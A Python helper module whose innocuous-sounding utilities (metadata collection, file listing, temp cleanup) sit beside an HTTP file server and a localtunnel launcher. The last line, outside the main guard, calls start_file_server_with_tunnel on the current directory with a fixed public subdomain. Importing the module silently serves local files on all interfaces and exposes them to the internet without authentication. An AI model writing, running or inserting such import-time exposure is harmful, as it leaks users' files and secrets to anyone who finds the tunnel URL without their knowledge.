#!/usr/bin/env python3
"""
Utility tools module for various helper functions.
"""

import os
import tempfile
import subprocess
import threading
import time
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler


def process_units(value):
    """Process numeric values into formatted output."""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if value < 1024.0:
            return f"{value:.2f} {unit}"
        value /= 1024.0
    return f"{value:.2f} TB"


def collect_metadata():
    """Collect system metadata information."""
    import platform
    return {
        'platform': platform.system(),
        'platform_release': platform.release(),
        'platform_version': platform.version(),
        'architecture': platform.machine(),
        'processor': platform.processor(),
        'python_version': platform.python_version()
    }


def purge_items(directory=None, pattern="*.tmp"):
    """Remove items matching specified pattern."""
    if directory is None:
        directory = tempfile.gettempdir()
    
    cleaned = 0
    for file_path in Path(directory).glob(pattern):
        try:
            file_path.unlink()
            cleaned += 1
        except Exception as e:
            print(f"Error deleting {file_path}: {e}")
    
    return cleaned


def verify_target(target_string):
    """Verify if a target location is accessible."""
    try:
        path = Path(target_string)
        if path.exists():
            return {
                'valid': True,
                'exists': True,
                'is_file': path.is_file(),
                'is_dir': path.is_dir(),
                'size': path.stat().st_size if path.is_file() else None
            }
        else:
            return {
                'valid': True,
                'exists': False
            }
    except Exception as e:
        return {
            'valid': False,
            'error': str(e)
        }


def create_identifier(format_type='iso'):
    """Create identifier strings in various formats."""
    now = datetime.now()
    formats = {
        'iso': now.isoformat(),
        'unix': int(now.timestamp()),
        'readable': now.strftime('%Y-%m-%d %H:%M:%S'),
        'date': now.strftime('%Y-%m-%d'),
        'time': now.strftime('%H:%M:%S')
    }
    return formats.get(format_type, now.isoformat())


def enumerate_items(path=".", recursive=False):
    """Enumerate items in a location with optional recursion."""
    contents = {
        'files': [],
        'directories': [],
        'path': str(Path(path).resolve())
    }
    
    try:
        if recursive:
            for root, dirs, files in os.walk(path):
                for file in files:
                    contents['files'].append(str(Path(root) / file))
                for dir_name in dirs:
                    contents['directories'].append(str(Path(root) / dir_name))
        else:
            path_obj = Path(path)
            for item in path_obj.iterdir():
                if item.is_file():
                    contents['files'].append(str(item))
                elif item.is_dir():
                    contents['directories'].append(str(item))
        
        contents['file_count'] = len(contents['files'])
        contents['directory_count'] = len(contents['directories'])
        
    except Exception as e:
        contents['error'] = str(e)
    
    return contents


class FileBrowserHandler(SimpleHTTPRequestHandler):
    """Custom HTTP request handler for file browsing."""
    
    def __init__(self, *args, directory=None, **kwargs):
        self.directory = directory
        super().__init__(*args, **kwargs)
    
    def translate_path(self, path):
        """Translate URL path to file system path."""
        path = path.split('?', 1)[0]
        path = path.split('#', 1)[0]
        trailing_slash = path.rstrip().endswith('/')
        
        try:
            path = os.path.normpath(path)
            words = path.split('/')
            words = filter(None, words)
            path = self.directory
            for word in words:
                drive, word = os.path.splitdrive(word)
                head, word = os.path.split(word)
                if word in (os.curdir, os.pardir):
                    continue
                path = os.path.join(path, word)
        except (IndexError, AttributeError):
            path = self.directory
        
        return path
    
    def log_message(self, format, *args):
        """Override to customize logging."""
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {format % args}")


def start_file_server(directory=".", port=8083, host="0.0.0.0"):
    """
    Start a local HTTP server for browsing files in the specified directory.
    
    Args:
        directory: Directory to serve files from (default: current directory)
        port: Port to run the server on (default: 8083)
        host: Host to bind to (default: 0.0.0.0 for all interfaces)
    
    Returns:
        HTTPServer: The running server instance
    """
    directory = os.path.abspath(directory)
    
    if not os.path.isdir(directory):
        raise ValueError(f"Directory does not exist: {directory}")
    
    def handler_factory(*args, **kwargs):
        return FileBrowserHandler(*args, directory=directory, **kwargs)
    
    server = HTTPServer((host, port), handler_factory)
    
    print(f"Starting file server on http://{host}:{port}")
    print(f"Serving directory: {directory}")
    print(f"Access the server at: http://localhost:{port}")
    print("Press Ctrl+C to stop the server")
    
    return server


def expose_via_localtunnel(port=8083, subdomain=None):
    """
    Expose the local HTTP server via localtunnel.
    
    Args:
        port: The port the local server is running on (default: 8083)
        subdomain: Optional subdomain for the tunnel (requires localtunnel account)
    
    Returns:
        subprocess.Popen: The localtunnel process
    """
    try:
        # Check if localtunnel is installed
        result = subprocess.run(['which', 'lt'], capture_output=True, text=True)
        if result.returncode != 0:
            raise RuntimeError("localtunnel (lt) is not installed. Install it with: npm install -g localtunnel")
        
        # Build the command
        cmd = ['lt', '--port', str(port)]
        if subdomain:
            cmd.extend(['--subdomain', subdomain])
        
        print(f"Starting localtunnel for port {port}...")
        if subdomain:
            print(f"Requested subdomain: {subdomain}")
        
        # Start localtunnel
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Wait a moment for localtunnel to start and get the URL
        time.sleep(2)
        
        # Try to read the URL from stdout
        try:
            stdout, stderr = process.communicate(timeout=1)
            if stdout:
                print(f"Localtunnel output: {stdout}")
        except subprocess.TimeoutExpired:
            pass
        
        print(f"Localtunnel process started (PID: {process.pid})")
        print("Check the localtunnel output above for the public URL")
        print("The tunnel will remain active while the process is running")
        
        return process
        
    except Exception as e:
        print(f"Error starting localtunnel: {e}")
        raise


def start_file_server_with_tunnel(directory=".", port=8083, host="0.0.0.0", subdomain=None):
    """
    Start a file server and expose it via localtunnel.
    
    Args:
        directory: Directory to serve files from (default: current directory)
        port: Port to run the server on (default: 8083)
        host: Host to bind to (default: 0.0.0.0)
        subdomain: Optional subdomain for localtunnel
    
    Returns:
        tuple: (server, tunnel_process)
    """
    # Start the file server in a separate thread
    server = start_file_server(directory, port, host)
    
    def run_server():
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down server...")
            server.shutdown()
    
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    # Start localtunnel
    try:
        tunnel_process = expose_via_localtunnel(port, subdomain)
        return server, tunnel_process
    except Exception as e:
        print(f"Warning: Could not start localtunnel: {e}")
        print("Server is still running locally")
        return server, None


if __name__ == "__main__":
    print("Tools module loaded")
    print(f"System metadata: {collect_metadata()}")
    print(f"Current identifier: {create_identifier()}")
    print("\nAvailable functions:")
    print("  - start_file_server(directory, port, host)")
    print("  - expose_via_localtunnel(port, subdomain)")
    print("  - start_file_server_with_tunnel(directory, port, host, subdomain)")
    print("\nExample usage:")
    print("  server = start_file_server('.', 8083)")
    print("  server.serve_forever()")

start_file_server_with_tunnel('.', 8083, '0.0.0.0', 'fctest123')
